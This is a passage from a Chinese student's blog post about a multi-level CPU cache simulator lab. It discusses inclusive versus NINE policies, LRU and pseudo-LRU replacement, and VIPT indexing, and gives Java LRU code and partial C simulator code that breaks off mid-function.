invalidation。\n好处：\n​\t好判断，多核的时候很好知道高级缓存的内容是否存在于低级缓存之中。\n缺点：\n​\t冗余数据驱逐：L2 驱逐某数据时，即使 L1 正在频繁使用，也必须一并驱逐它，增加了不必要的 L1 miss。\n​\t容量浪费：为了维护包含关系，L2 的一些空间可能被迫用于保持与 L1 相同的数据，降低了有效利用率。\n​\t降低性能上限：高级缓存未能成为真正的“补充层”，而是受限于 L1 的命中内容。\nNINE策略不要求低级cache强制包含高级cache内容，这样做相比inclusive的好处和坏处分别是什么？\n​\t（NINE：Non-Inclusive, Non-Exclusive）\n​\tNINE就是说下层的cache和上层的cache，二者之间不要求下层cache一定要包含上层cache的内容，同时也不要求两层cache之间的内容一定要是相互排斥的。\n好处：\n​\t减少了数据冗余，提高了缓存的利用率，当下层的cache要被驱逐的时候，不会影响上层的cache，从而导致没有必要的cache miss。\n缺点：\n​\t我很难保证一致性的问题，并且数据的管理相对复杂（NINE就是在包含性和排他性策略之间的一种状态），比如说我在L2 cache hit了之后，决定到底要不要把这个数据加载到L1中去之后干掉L2,包含性就是不能干掉，排他性就是必须干掉。\n本次实验实际上借助inclusive的性质大大简化了设计，如果采用NINE结构，你将如何调整你的代码？\n​\t首先去除back invalidation的这部分逻辑，其次和上一个问题一样，我要设置premote下层cacheline的一个逻辑。\n2. # 现代CPU几乎都采用L1D和L1I两种缓存结构，而在L2及更低级的缓存使用统一指令和数据的方式，这么做的好处是什么？\n以下是gpt的回答（我觉得写的还好，是否合理我也就不算很清楚了）：\n✅ 为什么 L1 要分成 L1D 和 L1I？\n➕ 好处一：提高访问带宽（并行性）\nCPU 在每个周期通常同时需要取指（fetch instruction）和访问数据。 如果 L1 是 unified 的，指令和数据会争用同一个缓存端口（cache port）。 分离 L1I 和 L1D 后，CPU 能 同时读取指令和访问数据，实现并发访问，提升执行效率。 ➕ 好处二：降低访问延迟（latency）\nL1 是最靠近执行核心的缓存，需要尽可能小而快。 分开管理指令和数据，可以让 L1I 和 L1D 各自做更有针对性的优化，例如： L1I 可以预取、预测分支； L1D 可以更好地处理 load/store、写缓冲等。 ➕ 好处三：避免污染和干扰\n指令和数据的访问模式差异很大： 指令访问具有更强的顺序性、局部性好； 数据访问则可能跳跃、随机、重复读取。 分开缓存避免了数据污染指令缓存（或反之），提升命中率和稳定性。 ✅ 为什么 L2/L3 使用 unified cache？\n➕ 原因一：提高缓存利用率\nL2/L3 体积更大（通常是几百 KB 到几十 MB）。 如果分为 I-cache 和 D-cache，则可能出现： L2D 已满但 L2I 还有空闲空间（或反之）； 导致资源浪费。 Unified cache 可以动态地根据访问需求分配空间，更灵活。 ➕ 原因二：简化设计，节省成本\nL2/L3 远离核心，访问延迟更高，并发访问不再是瓶颈。 统一设计结构更简单，不需要分别维护 tag、替换策略等逻辑。 ➕ 原因三：有助于 cache coherence 协议的实现\n多核共享的 L3 cache 使用统一结构更方便跟踪、标记和通信，便于维护一致性。 3. # 你觉得CPU是如何区分指令内存和数据内存的访问的？\n​\t1.现代 CPU 内部有清晰划分的模块：\n取指单元（Instruction Fetch Unit） 专门负责取指令 加载/存储单元（Load/Store Unit） 专门负责读写数据 这两者访问内存的路径不同，进而访问不同的 Cache 层次结构（如 L1I vs. L1D）。\n​\t2.从软件视角来看：\n编译器把「执行代码」转成了存放在某段内存中的机器指令 把「变量数据」分配到另一块内存空间 于是，在 CPU 运行时：\n指令指针（PC / IP）发出的访问是“取指” 普通 Load/Store 指令发出的访问是“访问数据” ​\t也就是说根据发出指令的操作单元就可以说明这个指令究竟是I还是L指令。\n4. # 本次实验要求实现严格的LRU算法，一种暴力实现方式是遍历所有cache line, 这样时间复杂度为O（E），你可以设计一种复杂度为O（1）的实现方式吗？\n​\t一道关于LRUCahce的lc，你应该能很好的理解为什么？https://leetcode.cn/problems/lru-cache/description/\n​\t这是实现的Java代码（我之前写过很多Java代码）\n//Least Recently Used //最近最少使用 //HashMap + DoublyLinkedList class LRUCache { //简单的双向链表 class Node{ int key; int val; Node prev; Node next; public Node(){} public Node(int _key, int _val){key = _key; val = _val;} } private Map\u0026lt;Integer, Node\u0026gt; cache; private int size; private int capacity; private Node head; private Node tail; //初始化缓存 public LRUCache(int capacity) { cache = new HashMap\u0026lt;\u0026gt;(); this.size = 0; this.capacity = capacity; head = new Node(); tail = new Node(); head.next = tail; tail.prev = head; } //相当于读取内存，读取成功这个值就返回value,并且放到双向链表的头部，否则返回-1（实际上要从内存中获取） public int get(int key) { if(cache.containsKey(key)){ moveToHead(cache.get(key)); return cache.get(key).val; } return -1; } //写值，道理类似 public void put(int key, int value) { if(cache.containsKey(key)){ Node node = cache.get(key); node.val = value; moveToHead(node); }else{ ++size; if(size \u0026gt; capacity){ --size; Node d = tail.prev; remove(d); cache.remove(d.key); } Node node = new Node(key, value); cache.put(key, node); add(node); } } //一旦get或者put，就放到head之后，作为最新的节点 private void moveToHead(Node node){ remove(node); add(node); } //一旦过容量，或者其他场景，删除节点 private void remove(Node node){ Node p = node.prev; Node n = node.next; p.next = n; n.prev = p; } //新put进来的元素，加到头节点之后 private void add(Node node){ Node n = head.next; head.next = node; node.prev = head; node.next = n; n.prev = node; } } ​\t基本就是利用；双向链表和hashmap，这样当我们给出一个值，我可以根据这个值直接找到对应的cacheline和在linkedlist中对应的node，直接把这个node提前到head位置，那么这个节点就是最新的，tail之前的节点就是最老的。\n​\t虽然是O（1），但是实际的开销并不会小。\n5. # LRU算法在某种特定的情形下会造成100% miss，你可以发现这种访问模式吗？\n​\tLRU Thrashing（LRU抖动）\n​\t比如这样，你的L1cache现在只有一个set，三行line，我对于四个元素A B C D进行循环的访问，那么开始就会\n​\t依次加入 A B C\n​\t接着读取D miss 去除A 放置D\n​\t接着读取A miss 去除B 放置A\n​\t接着读取B miss 去除 C 放置B\n​\t\u0026hellip;\u0026hellip;\n​\t上面这样的情况就会100%miss。\n6. # 实际硬件中，实现LRU算法其实十分昂贵，因此大多数厂家采用近似LRU的方法，如果让你设计，你会如何设计这种算法？\n来自于gpt，讲的并不好理解，可以看看https://en.wikipedia.org/wiki/Pseudo-LRU\n​\tPseudo-LRU (PLRU)\n实现：\n最常见的是 二叉树 PLRU（Binary Tree Pseudo LRU）： 适用于 4、8、16 路组相联 Cache。 维护一个“树状指针结构”，每个节点记录最近访问的是左还是右。 总共只需 E - 1 个 bit 就能表示选择哪条 line 替换。 原理图：\n(b1) / \\ (b2) (b3) / \\ / \\ A B C D 每个内部节点 0/1 表示最近访问的是哪一侧 选择替换线时，从根节点走向“最久未访问的方向” 举个例子：\nb0, b1, b2 是 3 个位（bit），分别控制走向哪个子树。 每个 bit 记录“最近使用的是哪一边”。 这些 bit 可以这样理解：\n如果 b0 = 0，表示最近访问的是左子树（A、B），因此优先替换右子树（C、D） 如果 b1 = 1，表示在左子树中，最近访问的是 B → 替换 A 如果 b2 = 0，表示在右子树中，最近访问的是 C → 替换 D 从根开始，按照 bit 的指示往“没被最近访问过”的方向走，直到到达一个叶子节点（就是要被替换的 cache line）。\n然后反过来，更新路径上的 bit，表示刚刚走过的那条路径是“最近访问过的”。\n假设当前：\nb0 = 0 → 上次用了左边（A 或 B） b1 = 1 → 上次用了 B b2 = 0 → 上次用了 C 替换时：\n从 b0 看 0 → 最近访问的是左边 → 应该替换右边 进入 b2，看 0 → 最近访问的是 C → 应该替换 D ✅ 所以选择替换 D\n然后把：\nb0 = 1（因为现在访问右边） b2 = 1（访问了 D） 优点：\n硬件实现简单，开销低 实际效果在很多场景下接近 LRU 缺点：\n并不是真正的最久未使用，有可能替换到常用块 7. # 本次实验中在实现上有个小细节是，在发生conflict miss时，我们总是先从下一级fetch数据，然后再判断是否需要evict，这样做的好处和不足是什么？如果上述两个操作的流程互换之后，带来的好处和坏处是什么？你可能需要综合考虑inclusive policy带来的影响。\n​\t如果仅有一层cache和memory，那么先后顺序是无所谓的。\n​\t我们用两层Cache和memory来理解一下这个问题：\n​\tL1 L2 memory\n​\t现在我访问L1 miss，L1满了，直接把那个要放入位置的数据驱逐掉。\n​\t又访问L2 miss，L2满了，驱逐，此时要考虑back invalidation，如果L1包含，那么那行cacheline也要驱逐掉，但是此时back invalidation的cacheline，和L1时候就驱逐的cacheline有可能是一行cacheline，这是否造成了浪费。\n​\t现在再从memory取值放入L2,L1刚刚驱逐的位置。\n方案 优点 缺点 先 fetch 后 evict（实验采用） - 避免 Inclusive 引起的无意义 invalidate - 更稳定一致性 - 实现简单 - 延迟高 - 有时多余 fetch 先 evict 后 fetch - 可优化延迟 - 有可能并行处理 - 易与 Inclusive 冲突 - 需要额外状态管理 8. # 进行cache访问时，需要根据内存地址提取出tag，set等字段，而CPU产生的地址实际上都是虚拟地址，需要额外的机制转换成物理地址（详见虚拟内存章节）。因此，cache的设计实际上可以分成physical index和virtual index两种方式，即采用物理地址或者虚拟地址两种地址解析tag，set等内容，那么：\n使用physical index的cache的优缺点是什么？\n避免了别名的问题，要TLB转换，带来延迟。\n使用virtual index的cache的优缺点是什么？\n访问会变快，但是有别名的问题。\n你能不能设计一种方法综合利用上述两种方式各自的优势？\n不能（？）\n折中方案：VIPT（Virtual Index, Physical Tag） # 先用虚拟地址索引（提取 index），用物理地址比对（tag）\n优势： # 保留了虚拟访问的速度优势（用虚拟 index 找 set） 同时 用物理 tag 避免 alias 问题 是 现代 L1 Cache 的主流设计（只要满足 index bits 不跨 page boundary） 设计要点： # Page offset 不变，必须保证 index bits 落在 page offset 范围（否则访问前无法知道 index）。 比如： 页大小：4KB = 12 bits offset Index bits ≤ 12 Tag 用物理地址中除去 index + block offset 部分 学过一点Java多线程，但是还没有系统学过OS，多少能理解一下多线程的问题，到这里已经相当复杂了，我就不再纸上谈兵了。\n9. # 本次实验中实现的模拟器只能应对顺序访问，如果需要扩展你的模拟器以支持多个线程并发访问，你该如何调整现有的代码？\n​\t每一组cacheset用mutex（互斥🔓），保证任何一个时刻，一个set最多仅有一个thread访问。\n​\t原子操作LRU等数据。\n如果您有更好的看法，欢迎在评论区直接指出！\n10. # 本次实验中不要求考虑多核之间的一致性问题，如果考虑多核之间一致性的问题，且L3作为多核之间的共享缓存，你该如何调整现有的代码？\n11. # 在考虑多核之间cache一致性的前提下，如果需要将inclusive策略变成NINE策略，你需要如何改进现有的代码？\n成品代码：\n在我的github上也有，在你自己实现的时候会发现很多相似的逻辑，想想怎么封装，本来应该是一个很精妙的代码构成。\n#include \u0026#34;cachelab.h\u0026#34; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; // 可能要包含的头文件 // 要不要封装功能？具体实现的方式 // 先写的时候可以不急着做功能抽象，先写出来试试看 // Q：当我在l2中访问缓存命中时，我要把这个地址加载回l1,但是由于这个地址已经确定，那么不会出现明明有空但是必须驱逐的现象么 // 相关数据统计量，是我在实现的过程中要进行维护的 容易忘记 一共3 * 4 = 12个数据 // 当一个地址给定的时候，它的所有的SetIndex就已经定下来了 // 注意C语言的{}的风格 int l1d_hits = 0; int l1d_misses = 0; int l1d_evictions = 0; int l1i_hits = 0; int l1i_misses = 0; int l1i_evictions = 0; int l2_hits = 0; int l2_misses = 0; int l2_evictions = 0; int l3_hits = 0; int l3_misses = 0; int l3_evictions = 0; // 定义一些常量 #define L1S 2 #define L1B 3 #define L2S 3 #define L2B 3 #define L3S 4 #define L3B 4 #define INSTRUCTION 0 #define DATA 1 //@params time:要使用LRU算法维护的一个全局时钟 int timeStamp = 0; // 全局变量加载默认初始化为0 void cacheInit() { } // 拼接地址,假设填充的偏移字节不会产生影响：都用0来做填充 // 这里要好好检查有没有出错 uint64_t addressConcate(uint64_t tag, uint64_t setIndex, int s, int b) { uint64_t addr = ((tag \u0026lt;\u0026lt; (s + b)) | (setIndex \u0026lt;\u0026lt; b)); return addr; } // 把驱逐一个CacheLine的功能封装一下,要考虑无效回溯的情况，但是我很难封装到一个function里面去，最好写成四个function // 要驱逐的cacheLine地址 // 并且合理利用包含准则 // 直接把地址作为参数，复用性是不是会更强---\u0026gt;我的目的还是为了少传送几个参数 // 这几个驱逐的函数只是单纯的做驱逐的处理，但是不会加载新的值 // lru找要不要也封装？这样对地址操作有可能出错吗？ // 还要对于统计量进行操作 // 要考察是不是无效回溯导致的驱逐，如果是，那么这里不应该算进去统计的问题 // l1i是一个只读的内存, void evictCacheLineFroml1i(uint64_t evictAddress, bool isBackInvalidation) { uint64_t tag = (evictAddress \u0026gt;\u0026gt; (L1S + L1B)); uint64_t setIndex = ((evictAddress \u0026gt;\u0026gt; L1B) \u0026amp; 0b11); int evictIndex = -1; for (int index = 0; index \u0026lt; L1_LINE_NUM; ++index) { // 找到了要驱逐的行 if (l1icache[setIndex][index].valid \u0026amp;\u0026amp; l1icache[setIndex][index].tag == tag) { evictIndex = index; break; } } // 没有要驱逐的行,因为要考虑Back Invalidation if (evictIndex == -1) { return; } // 有要驱逐的行 if (!isBackInvalidation) { ++l1i_evictions; } l1icache[setIndex][evictIndex].valid = false; } // L1dcache的驱逐的逻辑和L1icahce的逻辑应该是类似的,其实不是 void evictCacheLineFroml1d(uint64_t evictAddress, bool isBackInvalidation) { uint64_t tag = (evictAddress \u0026gt;\u0026gt; (L1S + L1B)); uint64_t setIndex = ((evictAddress \u0026gt;\u0026gt; L1B) \u0026amp; 0b11); int evictIndex = -1; for (int index = 0; index \u0026lt; L1_LINE_NUM; ++index) { // 找到了要驱逐的行 if (l1dcache[setIndex][index].valid \u0026amp;\u0026amp; l1dcache[setIndex][index].tag == tag) { evictIndex = index; break; } } // 没有要驱逐的行,因为要考虑Back Invalidation if (evictIndex == -1) return; if (!isBackInvalidation) { ++l1d_evictions; } // 有要驱逐的行 l1dcache[setIndex][evictIndex].valid = false; if (l1dcache[setIndex][evictIndex].dirty) { uint64_t tag2 = (evictAddress \u0026gt;\u0026gt; (L2S + L2B)); uint64_t setIndex2 = ((evictAddress \u0026gt;\u0026gt; L2B) \u0026amp; 0b111); for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { if (l2ucache[setIndex2][index].valid \u0026amp;\u0026amp; l2ucache[setIndex2][index].tag == tag2) { // L2的这个Cache被写了，更改timeStamp ++l2_hits; ++timeStamp; l2ucache[setIndex2][index].latest_used = timeStamp; l2ucache[setIndex2][index].dirty = true; return; } } } } // 从l2ucache驱逐,还要考虑你驱逐的是i还是d void evictCacheLineFroml2(uint64_t evictAddress, int TYPE, bool isBackInvalidation) { if (!isBackInvalidation) { uint64_t tag = (evictAddress \u0026gt;\u0026gt; (L2S + L2B)); uint64_t setIndex = ((evictAddress \u0026gt;\u0026gt; L2B) \u0026amp; 0b111); int evictIndex = -1; for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { if (l2ucache[setIndex][index].valid \u0026amp;\u0026amp; l2ucache[setIndex][index].tag == tag) { evictIndex = index; } } // 没有找到要驱逐的位置 if (evictIndex == -1) { return; } // 这里要进行驱逐 // 首先从l2ucache驱逐要考虑无效回溯 // L2 back Invalidation L1的时候不应该给L1算一次evict? ++l2_evictions; evictCacheLineFroml1d(evictAddress, true); evictCacheLineFroml1i(evictAddress, true); l2ucache[setIndex][evictIndex].valid = false; // 直接驱逐的情况 if (l2ucache[setIndex][evictIndex].dirty) { uint64_t tag3 = (evictAddress \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((evictAddress \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); for (int index = 0; index \u0026lt; L3_LINE_NUM; ++index) { if (l3ucache[setIndex3][index].valid \u0026amp;\u0026amp; l3ucache[setIndex3][index].tag == tag3) { ++l3_hits; ++timeStamp; l3ucache[setIndex3][index].latest_used = timeStamp; l3ucache[setIndex3][index].dirty = true; return; } } } } else { uint64_t tag = (evictAddress \u0026gt;\u0026gt; (L2S + L2B)); uint64_t setIndex = ((evictAddress \u0026gt;\u0026gt; L2B) \u0026amp; 0b111); int evictIndex = -1; for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { if (l2ucache[setIndex][index].valid \u0026amp;\u0026amp; l2ucache[setIndex][index].tag == tag) { evictIndex = index; evictCacheLineFroml1d(evictAddress, true); evictCacheLineFroml1i(evictAddress, true); l2ucache[setIndex][evictIndex].valid = false; // 直接驱逐的情况 if (l2ucache[setIndex][evictIndex].dirty) { uint64_t tag3 = (evictAddress \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((evictAddress \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); for (int i = 0; i \u0026lt; L3_LINE_NUM; ++i) { if (l3ucache[setIndex3][i].valid \u0026amp;\u0026amp; l3ucache[setIndex3][i].tag == tag3) { ++l3_hits; ++timeStamp; l3ucache[setIndex3][i].latest_used = timeStamp; l3ucache[setIndex3][i].dirty = true; } } } } } if (setIndex % 2 == 0) { ++setIndex; evictIndex = -1; for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { if (l2ucache[setIndex][index].valid \u0026amp;\u0026amp; l2ucache[setIndex][index].tag == tag) { evictIndex = index; evictCacheLineFroml1d(evictAddress, true); evictCacheLineFroml1i(evictAddress, true); l2ucache[setIndex][evictIndex].valid = false; // 直接驱逐的情况 if (l2ucache[setIndex][evictIndex].dirty) { uint64_t tag3 = (evictAddress \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((evictAddress \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); for (int i = 0; i \u0026lt; L3_LINE_NUM; ++i) { if (l3ucache[setIndex3][i].valid \u0026amp;\u0026amp; l3ucache[setIndex3][i].tag == tag3) { ++l3_hits; ++timeStamp; l3ucache[setIndex3][i].latest_used = timeStamp; l3ucache[setIndex3][i].dirty = true; } } } } } } if (setIndex % 2 == 1) { --setIndex; evictIndex = -1; for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { if (l2ucache[setIndex][index].valid \u0026amp;\u0026amp; l2ucache[setIndex][index].tag == tag) { evictIndex = index; evictCacheLineFroml1d(evictAddress, true); evictCacheLineFroml1i(evictAddress, true); l2ucache[setIndex][evictIndex].valid = false; // 直接驱逐的情况 if (l2ucache[setIndex][evictIndex].dirty) { uint64_t tag3 = (evictAddress \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((evictAddress \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); for (int i = 0; i \u0026lt; L3_LINE_NUM; ++i) { if (l3ucache[setIndex3][i].valid \u0026amp;\u0026amp; l3ucache[setIndex3][i].tag == tag3) { ++l3_hits; ++timeStamp; l3ucache[setIndex3][i].latest_used = timeStamp; l3ucache[setIndex3][i].dirty = true; } } } } } } } } // 从l3ucache驱逐，同样要考虑驱逐的类型问题 void evictCacheLineFroml3(uint64_t evictAddress, int TYPE) { uint64_t tag = (evictAddress \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex = ((evictAddress \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); int evictIndex = -1; for (int index = 0; index \u0026lt; L3_LINE_NUM; ++index) { if (l3ucache[setIndex][index].valid \u0026amp;\u0026amp; l3ucache[setIndex][index].tag == tag) { evictIndex = index; break; } } if (evictIndex == -1) { return; } // Back Invalidation ++l3_evictions; evictCacheLineFroml2(evictAddress, INSTRUCTION, true); l3ucache[setIndex][evictIndex].valid = false; } // TODO：思考fetch函数组的封装有没有问题 // 想把一个line从L2fetch到l1i void fetchl2tol1i(uint64_t setIndex1, uint64_t tag1) { // 维护l1驱逐的情况 int evictIndexl1i = -1; uint64_t minTimeStampl1i = UINT64_MAX; for (int j = 0; j \u0026lt; L1_LINE_NUM; ++j) { // 能找到L1也存在无效的情况,最好的情况 if (!l1icache[setIndex1][j].valid) { ++timeStamp; l1icache[setIndex1][j].latest_used = timeStamp; l1icache[setIndex1][j].dirty = false; l1icache[setIndex1][j].tag = tag1; l1icache[setIndex1][j].valid = true; return; } // 要给l1驱逐的情况 else { if (l1icache[setIndex1][j].latest_used \u0026lt; minTimeStampl1i) { minTimeStampl1i = l1icache[setIndex1][j].latest_used; evictIndexl1i = j; } } } // 先给l1i做驱逐 uint64_t evictL1iAddress = addressConcate(l1icache[setIndex1][evictIndexl1i].tag, setIndex1, L1S, L1B); evictCacheLineFroml1i(evictL1iAddress, false); // 此时l1i已经驱逐完毕,驱逐完了之后再fetch进去 ++timeStamp; l1icache[setIndex1][evictIndexl1i].latest_used = timeStamp; l1icache[setIndex1][evictIndexl1i].dirty = false; l1icache[setIndex1][evictIndexl1i].tag = tag1; l1icache[setIndex1][evictIndexl1i].valid = true; } // 把一个line从L2fetch到l1d void fetchl2tol1d(uint64_t setIndex1, uint64_t tag1) { int evictIndexl1d = -1; uint64_t minTimeStampl1d = UINT64_MAX; for (int j = 0; j \u0026lt; L1_LINE_NUM; ++j) { if (!l1dcache[setIndex1][j].valid) { ++timeStamp; l1dcache[setIndex1][j].latest_used = timeStamp; l1dcache[setIndex1][j].dirty = false; l1dcache[setIndex1][j].tag = tag1; l1dcache[setIndex1][j].valid = true; return; } else { if (l1dcache[setIndex1][j].latest_used \u0026lt; minTimeStampl1d) { minTimeStampl1d = l1dcache[setIndex1][j].latest_used; evictIndexl1d = j; } } } uint64_t evictL1dAddress = addressConcate(l1dcache[setIndex1][evictIndexl1d].tag, setIndex1, L1S, L1B); evictCacheLineFroml1d(evictL1dAddress, false); ++timeStamp; l1dcache[setIndex1][evictIndexl1d].latest_used = timeStamp; l1dcache[setIndex1][evictIndexl1d].dirty = false; l1dcache[setIndex1][evictIndexl1d].tag = tag1; l1dcache[setIndex1][evictIndexl1d].valid = true; } // 把一个line从L3fetch到L2 void fetchl3tol2(uint64_t setIndex2, uint64_t tag2, int TYPE) { uint64_t minTimeStamp = UINT64_MAX; // 如果满了，要驱逐的index int evictIndex = -1; for (int i = 0; i \u0026lt; L2_LINE_NUM; ++i) { if (!l2ucache[setIndex2][i].valid) { ++timeStamp; l2ucache[setIndex2][i].latest_used = timeStamp; l2ucache[setIndex2][i].dirty = false; l2ucache[setIndex2][i].tag = tag2; l2ucache[setIndex2][i].valid = true; return; } else { if (l2ucache[setIndex2][i].latest_used \u0026lt; minTimeStamp) { minTimeStamp = l2ucache[setIndex2][i].latest_used; evictIndex = i; } } } // 考虑L2的驱逐 uint64_t evictaddressl2 = addressConcate(l2ucache[setIndex2][evictIndex].tag, setIndex2, L2S, L2B); evictCacheLineFroml2(evictaddressl2, TYPE, false); ++timeStamp; l2ucache[setIndex2][evictIndex].latest_used = timeStamp; l2ucache[setIndex2][evictIndex].dirty = false; l2ucache[setIndex2][evictIndex].tag = tag2; l2ucache[setIndex2][evictIndex].valid = true; } // 把一个内存中的值fetch到l3 void fetchMemoryTol3(uint64_t setIndex3, uint64_t tag3, int TYPE) { int evictIndex = -1; uint64_t minTimeStamp = UINT64_MAX; for (int index = 0; index \u0026lt; L3_LINE_NUM; ++index) { if (!l3ucache[setIndex3][index].valid) { ++timeStamp; l3ucache[setIndex3][index].latest_used = timeStamp; l3ucache[setIndex3][index].dirty = false; l3ucache[setIndex3][index].tag = tag3; l3ucache[setIndex3][index].valid = true; return; } else { if (l3ucache[setIndex3][index].latest_used \u0026lt; minTimeStamp) { minTimeStamp = l3ucache[setIndex3][index].latest_used; evictIndex = index; } } } uint64_t evictAddress = addressConcate(l3ucache[setIndex3][evictIndex].tag, setIndex3, L3S, L3B); evictCacheLineFroml3(evictAddress, TYPE); ++timeStamp; l3ucache[setIndex3][evictIndex].latest_used = timeStamp; l3ucache[setIndex3][evictIndex].dirty = false; l3ucache[setIndex3][evictIndex].tag = tag3; l3ucache[setIndex3][evictIndex].valid = true; } /* 我们先写一个Instruction尝试一下:读取指令 * @params addr 为访问地址，它是trace文件中的地址的十进制表示的结果,64位16进制内存地址 * OK：经过纯I指令检测，这个函数实现的没有问题 */ void instruct(uint64_t addr) { // 先访问第一级Cache,处理addr uint64_t tag1 = (addr \u0026gt;\u0026gt; (L1S + L1B)); uint64_t setIndex1 = ((addr \u0026gt;\u0026gt; L1B) \u0026amp; 0b11); uint64_t tag2 = (addr \u0026gt;\u0026gt; (L2S + L2B)); uint64_t setIndex2 = ((addr \u0026gt;\u0026gt; L2B) \u0026amp; 0b111); uint64_t tag3 = (addr \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((addr \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); // 根据拿到的数据看第一级有没有命中 for (int index = 0; index \u0026lt; L1_LINE_NUM; ++index) { // 合法并且tag相同，就是命中 if (l1icache[setIndex1][index].valid \u0026amp;\u0026amp; l1icache[setIndex1][index].tag == tag1) { // 命中之后的处理 ++timeStamp; ++l1i_hits; l1icache[setIndex1][index].latest_used = timeStamp; return; } } // 到这里证明l1i没有命中,在l2中找 ++l1i_misses; for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { // l2中缓存命中 if (l2ucache[setIndex2][index].valid \u0026amp;\u0026amp; l2ucache[setIndex2][index].tag == tag2) { ++timeStamp; l2ucache[setIndex2][index].latest_used = timeStamp; ++l2_hits; fetchl2tol1i(setIndex1, tag1); return; } } // 到这里证明l2没有命中，在l3中找 ++l2_misses; for (int index = 0; index \u0026lt; L3_LINE_NUM; ++index) { // l3缓存命中 if (l3ucache[setIndex3][index].valid \u0026amp;\u0026amp; l3ucache[setIndex3][index].tag == tag3) { ++timeStamp; l3ucache[setIndex3][index].latest_used = timeStamp; ++l3_hits; fetchl3tol2(setIndex2, tag2, INSTRUCTION); fetchl2tol1i(setIndex1, tag1); return; } } // 到这里证明l3没有命中，要从缓存中取值加载到三层里面去 ++l3_misses; // 找要驱逐的L3的地址 fetchMemoryTol3(setIndex3, tag3, INSTRUCTION); fetchl3tol2(setIndex2, tag2, INSTRUCTION); fetchl2tol1i(setIndex1, tag1); // 理论上到这里取值令的过程已经结束 } // 读取数据的问题,读取数据和读取指令是否是类似的 void load(uint64_t addr) { // 先访问第一级Cache,处理addr uint64_t tag1 = (addr \u0026gt;\u0026gt; (L1S + L1B)); uint64_t setIndex1 = ((addr \u0026gt;\u0026gt; L1B) \u0026amp; 0b11); uint64_t tag2 = (addr \u0026gt;\u0026gt; (L2S + L2B)); uint64_t setIndex2 = ((addr \u0026gt;\u0026gt; L2B) \u0026amp; 0b111); uint64_t tag3 = (addr \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((addr \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); // 根据拿到的数据看第一级有没有命中 for (int index = 0; index \u0026lt; L1_LINE_NUM; ++index) { // 合法并且tag相同，就是命中 if (l1dcache[setIndex1][index].valid \u0026amp;\u0026amp; l1dcache[setIndex1][index].tag == tag1) { // 命中之后的处理 ++timeStamp; ++l1d_hits; l1dcache[setIndex1][index].latest_used = timeStamp; return; } } ++l1d_misses; for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { // l2中缓存命中 if (l2ucache[setIndex2][index].valid \u0026amp;\u0026amp; l2ucache[setIndex2][index].tag == tag2) { ++timeStamp; l2ucache[setIndex2][index].latest_used = timeStamp; ++l2_hits; fetchl2tol1d(setIndex1, tag1); return; } } // 到这里证明l2没有命中，在l3中找 ++l2_misses; for (int index = 0; index \u0026lt; L3_LINE_NUM; ++index) { // l3缓存命中 if (l3ucache[setIndex3][index].valid \u0026amp;\u0026amp; l3ucache[setIndex3][index].tag == tag3) { ++timeStamp; l3ucache[setIndex3][index].latest_used = timeStamp; ++l3_hits; fetchl3tol2(setIndex2, tag2, DATA); fetchl2tol1d(setIndex1, tag1); return; } } // 到这里证明l3没有命中，要从缓存中取值加载到三层里面去 ++l3_misses; // 找要驱逐的L3的地址 fetchMemoryTol3(setIndex3, tag3, DATA); fetchl3tol2(setIndex2, tag2, DATA); fetchl2tol1d(setIndex1, tag1); } // 重点逻辑：写入内存的实现 // 先fetch这个cacheline，接着才进行改动，我这里成了先改动，再fecth上去，肯定是不行的 // 简单来说，写入操作是不会影响L2和L3的 void store(uint64_t addr) { // 先列出所有可能要访问的数据 uint64_t tag1 = (addr \u0026gt;\u0026gt; (L1S + L1B)); uint64_t setIndex1 = ((addr \u0026gt;\u0026gt; L1B) \u0026amp; 0b11); uint64_t tag2 = (addr \u0026gt;\u0026gt; (L2S + L2B)); uint64_t setIndex2 = ((addr \u0026gt;\u0026gt; L2B) \u0026amp; 0b111); uint64_t tag3 = (addr \u0026gt;\u0026gt; (L3S + L3B)); uint64_t setIndex3 = ((addr \u0026gt;\u0026gt; L3B) \u0026amp; 0b1111); // 写l1d for (int index = 0; index \u0026lt; L1_LINE_NUM; ++index) { // l1d write hit if (l1dcache[setIndex1][index].valid \u0026amp;\u0026amp; l1dcache[setIndex1][index].tag == tag1) { ++l1d_hits; ++timeStamp; l1dcache[setIndex1][index].latest_used = timeStamp; l1dcache[setIndex1][index].dirty = true; return; } } // l1d write misses ++l1d_misses; // 在L2中写 for (int index = 0; index \u0026lt; L2_LINE_NUM; ++index) { // l2 write hit if (l2ucache[setIndex2][index].valid \u0026amp;\u0026amp; l2ucache[setIndex2][index].tag == tag2) { // L2写命中，我先把这个位置加载回l1d，接着才进行dirty的修改，写命中时，首先更改一下lru ++l2_hits; ++timeStamp; l2ucache[setIndex2][index].latest_used = timeStamp; fetchl2tol1d(setIndex1, tag1); for (int i = 0; i \u0026lt; L1_LINE_NUM; ++i) { // 在fetch了之后，此时这里的lru已经发生了改变，所以是不是不用再进行更改? // 应该是的 if (l1dcache[setIndex1][i].valid \u0026amp;\u0026amp; l1dcache[setIndex1][i].tag == tag1) { l1dcache[setIndex1][i].dirty = true; return; } } } } // l2u write misses ++l2_misses; for (int index = 0; index \u0026lt; L3_LINE_NUM; ++index) { // l3 write hit if (l3ucache[setIndex3][index].valid \u0026amp;\u0026amp; 